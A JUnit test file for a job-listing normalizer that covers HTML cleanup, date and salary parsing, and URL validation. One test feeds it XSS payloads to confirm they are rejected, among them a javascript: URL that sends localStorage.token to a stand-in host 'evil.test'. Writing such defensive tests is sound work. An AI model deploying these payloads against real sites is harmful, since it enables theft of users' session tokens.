package com.smartjobtracker.jobs.discovery;

import com.smartjobtracker.jobs.provider.JobProvider;
import com.smartjobtracker.jobs.provider.JobProvider.ProviderJob;
import com.smartjobtracker.model.JobPosting;
import org.junit.jupiter.api.Test;

import java.time.OffsetDateTime;
import java.time.ZoneOffset;

import static org.junit.jupiter.api.Assertions.*;

class JobNormalizerTest {
    private final JobNormalizer normalizer = new JobNormalizer();

    private JobPosting normalize(ProviderJob job) {
        return normalizer.normalize(JobProvider.JobPostingCandidate.from(job, "official"));
    }

    private static ProviderJob job(String location, String workMode, String postedAt, String description,
                                   Integer min, Integer max, String currency, String period) {
        return new ProviderJob("1", "Acme", "Engineer", location, null, workMode, "https://example.test/job",
                postedAt, description, null, min, max, currency, "{}", period);
    }

    @Test
    void stripsMarkupAndLeavesUnknownFieldsUnavailable() {
        JobProvider.JobPostingCandidate candidate = JobProvider.JobPostingCandidate.from(new ProviderJob("1", " Acme ", "Engineer", "Remote",
                null, null, "https://example.test/job", "not-a-date", "<p>Build <b>things</b></p>", null, null, null, null, "{}"), "official");
        JobPosting job = normalizer.normalize(candidate);
        assertEquals("Acme", job.getCompany());
        assertEquals("Build things", job.getDescription());
        assertNull(job.getPostedAt());
        assertNull(job.getSalaryMin());
        assertNull(job.getSalarySource());
        assertNotNull(job.getDedupeHash());
    }

    @Test
    void onlyHttpUrlsSurviveAsApplyOrLogoLinks() {
        assertEquals("https://jobs.example.test/1", JobNormalizer.httpUrl(" https://jobs.example.test/1 "));
        assertEquals("http://example.test", JobNormalizer.httpUrl("http://example.test"));
        assertNull(JobNormalizer.httpUrl("javascript:alert(document.domain)"));
        assertNull(JobNormalizer.httpUrl("JaVaScRiPt:alert(1)"));
        assertNull(JobNormalizer.httpUrl("data:text/html,<script>alert(1)</script>"));
        assertNull(JobNormalizer.httpUrl("//evil.test/x"));
        assertNull(JobNormalizer.httpUrl("not a url"));
        JobPosting job = normalizer.normalize(JobProvider.JobPostingCandidate.from(new ProviderJob("1", "Acme", "Engineer", "Remote",
                null, null, "javascript:fetch('//evil.test?t='+localStorage.token)", null, "x", null, null, null, null, "{}"), "telegram"));
        assertNull(job.getApplyUrl());
    }

    @Test
    void unescapesGreenhouseStyleHtmlAndKeepsParagraphsAndBullets() {
        String escaped = "&lt;h2&gt;About us&lt;/h2&gt;&lt;p&gt;We build &amp;amp; ship.&lt;/p&gt;"
                + "&lt;ul&gt;&lt;li&gt;Java&lt;/li&gt;&lt;li&gt;SQL&lt;/li&gt;&lt;/ul&gt;";
        JobPosting job = normalize(job("NYC", null, null, escaped, null, null, null, null));
        assertEquals("About us\nWe build & ship.\n\n• Java\n• SQL", job.getDescription());
        assertFalse(job.getDescription().contains("&lt;"));
    }

    @Test
    void parsesEveryDateFormatTheSourcesSend() {
        OffsetDateTime expected = OffsetDateTime.of(2026, 9, 3, 17, 30, 34, 0, ZoneOffset.UTC);
        assertEquals(expected.toInstant(), normalizer.parseDate("2026-09-03T13:30:34-04:00").toInstant()); // Greenhouse
        assertEquals(expected.toInstant(), normalizer.parseDate(String.valueOf(expected.toInstant().toEpochMilli())).toInstant()); // Lever
        assertEquals(expected.toInstant(), normalizer.parseDate(String.valueOf(expected.toEpochSecond())).toInstant());
        assertEquals(expected.toInstant(), normalizer.parseDate("2026-09-03T17:30:34").toInstant());
        assertEquals(OffsetDateTime.of(2026, 9, 3, 0, 0, 0, 0, ZoneOffset.UTC), normalizer.parseDate("2026-09-03")); // JobSpy
        assertNull(normalizer.parseDate("last week"));
        assertNull(normalizer.parseDate(" "));
    }

    @Test
    void providerSalaryWinsOverDescriptionSalary() {
        JobPosting job = normalize(job("Seattle, WA", null, null, "Salary: $90,000 - $100,000/yr",
                120_000, 150_000, "usd", "YEAR"));
        assertEquals(120_000, job.getSalaryMin());
        assertEquals(150_000, job.getSalaryMax());
        assertEquals("USD", job.getSalaryCurrency());
        assertEquals("PROVIDER", job.getSalarySource());
        assertFalse(job.getSalaryEstimated());
    }

    @Test
    void usesSalaryStatedInDescriptionWhenSourceHasNone() {
        JobPosting job = normalize(job("Seattle, WA", null, null, "<p>Salary: $193,232 - $288,000/yr</p>",
                null, null, null, null));
        assertEquals(193_232, job.getSalaryMin());
        assertEquals(288_000, job.getSalaryMax());
        assertEquals("YEAR", job.getSalaryPeriod());
        assertEquals("DESCRIPTION", job.getSalarySource());
        assertFalse(job.getSalaryEstimated());
    }

    @Test
    void remoteWorkModeFillsAMissingLocation() {
        assertEquals("Remote", normalize(job(null, "Remote", null, null, null, null, null, null)).getLocation());
        assertNull(normalize(job(null, "Hybrid", null, null, null, null, null, null)).getLocation());
        assertEquals("London", normalize(job("London", "Remote", null, null, null, null, null, null)).getLocation());
    }
}
